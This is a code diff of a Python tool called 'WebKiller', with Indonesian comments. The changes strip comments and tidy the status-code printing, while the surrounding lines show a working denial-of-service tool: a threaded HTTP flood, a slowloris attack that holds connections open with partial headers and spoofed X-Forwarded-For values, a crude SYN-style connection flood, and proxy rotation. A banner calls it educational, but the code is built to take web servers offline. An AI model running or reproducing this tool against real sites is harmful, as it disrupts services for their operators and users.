@@ -68,9 +68,9 @@ class Config:
     use_https = False
     threads = 50
     timeout = 5
-    duration = 0  # 0 = unlimited
+    duration = 0
     method = 'GET'
-    attack_type = 'mixed'  # http, slowloris, syn, mixed
+    attack_type = 'mixed'
     use_proxy = False
     proxy_file = 'proxy.txt'
     verbose = False
@@ -225,10 +225,8 @@ class WebKiller:
             'Pragma': 'no-cache',
         }
         
-        # Custom headers
         headers.update(self.config.custom_headers)
         
-        # Cookies
         if self.config.cookies:
             headers['Cookie'] = '; '.join([f'{k}={v}' for k, v in self.config.cookies.items()])
             
@@ -243,18 +241,16 @@ class WebKiller:
                 headers = self.get_headers()
                 proxy = self.get_proxy() if self.config.use_proxy else None
                 
-                # Randomize URL with query parameters
                 url = self.config.target_url
                 if '?' not in url:
                     url += '?'
                 url += f'&_={random.randint(1, 999999)}'
                 
-                # Prepare request
                 req_kwargs = {
                     'headers': headers,
                     'proxies': proxy,
                     'timeout': self.config.timeout,
-                    'verify': False,  # Nonaktifkan verifikasi SSL
+                    'verify': False,
                     'allow_redirects': False,
                 }
                 
@@ -266,7 +262,6 @@ class WebKiller:
                     else:
                         req_kwargs['data'] = f'key{random.randint(1,999)}={random.randint(1,999)}'
                         
-                # Send request
                 start = time.time()
                 if self.config.method == 'GET':
                     r = session.get(url, **req_kwargs)
@@ -321,7 +316,6 @@ class WebKiller:
         
         while not stop_event.is_set():
             try:
-                # Create socket
                 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                 sock.settimeout(5)
                 
@@ -333,7 +327,6 @@ class WebKiller:
                     
                 sock.connect((self.config.target_ip, self.config.target_port))
                 
-                # Send initial headers
                 headers = [
                     f"GET /?{random.randint(0, 9999)} HTTP/1.1",
                     f"Host: {self.config.target_ip}",
@@ -344,16 +337,12 @@ class WebKiller:
                     f"X-Forwarded-For: {random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
                 ]
                 
-                # Add random headers
                 for _ in range(random.randint(5, 15)):
                     headers.append(f"X-{random.randint(1,999)}: {random.randint(1,999)}")
                     
                 sock.send(('\r\n'.join(headers) + '\r\n').encode())
-                
-                # Keep connection alive by sending partial headers periodically
                 sockets.append(sock)
                 
-                # Maintain sockets
                 for s in sockets[:]:
                     try:
                         s.send(f"X-{random.randint(1,999)}: {random.randint(1,999)}\r\n".encode())
@@ -361,7 +350,6 @@ class WebKiller:
                         sockets.remove(s)
                         
                 if len(sockets) > self.config.threads * 2:
-                    # Close oldest socket if too many
                     try:
                         sockets.pop(0).close()
                     except:
@@ -374,7 +362,6 @@ class WebKiller:
                     print(f"{Colors.RED}[{thread_id}] SLOWLORIS ERROR: {str(e)[:30]}{Colors.END}")
                 time.sleep(1)
                 
-        # Cleanup sockets
         for s in sockets:
             try:
                 s.close()
@@ -385,17 +372,10 @@ class WebKiller:
         """SYN flood attack (simulated)"""
         while not stop_event.is_set():
             try:
-                # Create socket
                 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                 sock.settimeout(1)
-                
-                # Connect but don't complete handshake
                 sock.connect((self.config.target_ip, self.config.target_port))
-                
-                # Send SYN
                 sock.send(b'SYN')
-                
-                # Close immediately
                 sock.close()
                 
                 with lock:
@@ -435,7 +415,6 @@ class WebKiller:
         stats['start_time'] = time.time()
         self.running = True
         
-        # Start threads
         attack_func = {
             'http': self.http_attack,
             'slowloris': self.slowloris_attack,
@@ -449,7 +428,6 @@ class WebKiller:
             t.start()
             self.threads.append(t)
             
-        # Monitor
         try:
             while not stop_event.is_set():
                 if self.config.duration > 0 and time.time() - stats['start_time'] > self.config.duration:
@@ -468,7 +446,6 @@ class WebKiller:
         stop_event.set()
         self.running = False
         
-        # Wait for threads
         for t in self.threads:
             t.join(timeout=1)
             
@@ -491,15 +468,22 @@ class WebKiller:
             if stats['status_codes']:
                 print(f"{Colors.WHITE}Status Codes:{Colors.END}")
                 for code, count in sorted(stats['status_codes'].items()):
-                    if code in ['TIMEOUT', 'CONNECTION_ERROR', 'ERROR']:
+                    # PERBAIKAN: Handle both string and int codes
+                    if isinstance(code, str):
                         color = Colors.RED
-                    elif isinstance(code, int) and 200 <= code < 300:
-                        color = Colors.GREEN
-                    elif isinstance(code, int) and 300 <= code < 400:
-                        color = Colors.BLUE
+                        display_code = code
+                    elif isinstance(code, int):
+                        if 200 <= code < 300:
+                            color = Colors.GREEN
+                        elif 300 <= code < 400:
+                            color = Colors.BLUE
+                        else:
+                            color = Colors.YELLOW
+                        display_code = str(code)
                     else:
                         color = Colors.YELLOW
-                    print(f"  {color}{code}: {count}{Colors.END}")
+                        display_code = str(code)
+                    print(f"  {color}{display_code}: {count}{Colors.END}")
                     
     def show_final_stats(self):
         """Show final statistics"""
@@ -518,15 +502,22 @@ class WebKiller:
         if stats['status_codes']:
             print(f"{Colors.WHITE}Status Code Distribution:{Colors.END}")
             for code, count in sorted(stats['status_codes'].items()):
-                if code in ['TIMEOUT', 'CONNECTION_ERROR', 'ERROR']:
+                # PERBAIKAN: Handle both string and int codes
+                if isinstance(code, str):
                     color = Colors.RED
-                elif isinstance(code, int) and 200 <= code < 300:
-                    color = Colors.GREEN
-                elif isinstance(code, int) and 300 <= code < 400:
-                    color = Colors.BLUE
+                    display_code = code
+                elif isinstance(code, int):
+                    if 200 <= code < 300:
+                        color = Colors.GREEN
+                    elif 300 <= code < 400:
+                        color = Colors.BLUE
+                    else:
+                        color = Colors.YELLOW
+                    display_code = str(code)
                 else:
                     color = Colors.YELLOW
-                print(f"  {color}{code}: {count}{Colors.END}")
+                    display_code = str(code)
+                print(f"  {color}{display_code}: {count}{Colors.END}")
         print(f"\n{Colors.GREEN}✅ Web Killer Stopped!{Colors.END}\n")
         
     def show_help(self):
@@ -583,7 +574,6 @@ def main():
     print(f"{Colors.RED}⚠️  WARNING: For educational and authorized testing only!{Colors.END}")
     print(f"{Colors.RED}⚠️  Do not use for illegal purposes!{Colors.END}\n")
     
-    # Nonaktifkan warning
     warnings.filterwarnings('ignore')
     urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
     
